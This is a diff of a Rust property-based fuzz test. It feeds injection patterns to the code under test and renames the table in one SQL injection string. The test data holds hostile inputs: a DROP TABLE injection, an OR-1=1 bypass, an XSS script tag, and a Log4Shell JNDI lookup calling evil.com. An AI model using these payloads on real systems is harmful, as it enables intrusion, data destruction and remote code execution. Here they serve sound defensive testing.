@@ -192,7 +192,7 @@ proptest! {
     /// Fuzz with potential injection patterns
     #[test]
     fn fuzz_injection_patterns(pattern in prop_oneof![
-        Just("'; DROP TABLE tuples; --"),
+        Just("'; DROP TABLE relationships; --"),
         Just("1' OR '1'='1"),
         Just("<script>alert('xss')</script>"),
         Just("${jndi:ldap://evil.com/a}"),
